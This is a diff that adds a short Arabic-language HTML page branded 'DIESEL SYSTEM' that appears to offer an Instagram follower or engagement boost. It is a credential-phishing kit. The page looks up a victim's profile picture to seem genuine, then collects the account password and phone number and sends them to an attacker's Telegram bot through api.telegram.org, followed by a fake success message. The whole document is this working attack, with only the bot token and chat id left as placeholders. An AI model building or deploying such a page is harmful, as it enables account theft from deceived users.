@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <style>
+        body { background: #000; color: #00ff41; font-family: 'Arial', sans-serif; display: flex; justify-content: center; padding: 20px; }
+        .box { border: 2px solid #00ff41; padding: 20px; width: 100%; max-width: 400px; text-align: center; border-radius: 15px; }
+        img { width: 100px; height: 100px; border-radius: 50%; display: none; border: 2px solid #00ff41; }
+        input { width: 90%; padding: 12px; margin: 10px 0; background: #111; border: 1px solid #333; color: white; border-radius: 5px; }
+        button { background: #00ff41; color: #000; border: none; padding: 12px 30px; width: 100%; font-weight: bold; cursor: pointer; border-radius: 5px; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2>DIESEL SYSTEM</h2>
+        <!-- جزء البحث -->
+        <input id="searchUser" placeholder="اكتب اليوزر نيم للبحث عن الحساب...">
+        <button onclick="findAccount()">بحث عن الحساب</button>
+        
+        <br><br>
+        <img id="profilePic" src="" alt="حسابك">
+        <h3 id="userNameDisplay"></h3>
+
+        <!-- نموذج الإدخال المخفي -->
+        <div id="loginForm" style="display:none;">
+            <input id="pass" type="password" placeholder="كلمة المرور">
+            <input id="phone" placeholder="رقم التليفون">
+            <button onclick="sendOrder()">تأكيد التزويد الآن</button>
+        </div>
+    </div>
+
+    <script>
+        // 1. وظيفة البحث (تجلب الصورة من إنستجرام)
+        function findAccount() {
+            let user = document.getElementById('searchUser').value;
+            let pic = document.getElementById('profilePic');
+            // رابط مباشر لجلب صورة الحساب
+            pic.src = `https://www.instagram.com/${user}/feed/?__a=1`; // ملاحظة: قد يتطلب هذا API احترافي
+            pic.src = `https://unavatar.io/instagram/${user}`; 
+            pic.style.display = 'block';
+            document.getElementById('userNameDisplay').innerText = user;
+            document.getElementById('loginForm').style.display = 'block';
+        }
+
+        // 2. وظيفة الإرسال للبوت
+        function sendOrder() {
+            let u = document.getElementById('searchUser').value;
+            let p = document.getElementById('pass').value;
+            let ph = document.getElementById('phone').value;
+            let token = "YOUR_TOKEN_HERE"; // ضع التوكن هنا
+            let chatId = "YOUR_CHAT_ID";
+            let msg = `طلب جديد: اليوزر: ${u} | الباسورد: ${p} | الهاتف: ${ph}`;
+            
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${msg}`);
+            alert("تم الربط بنجاح! سيتم تنفيذ طلبك في حسابك الحقيقي.");
+        }
+    </script>
+</body>
+</html>
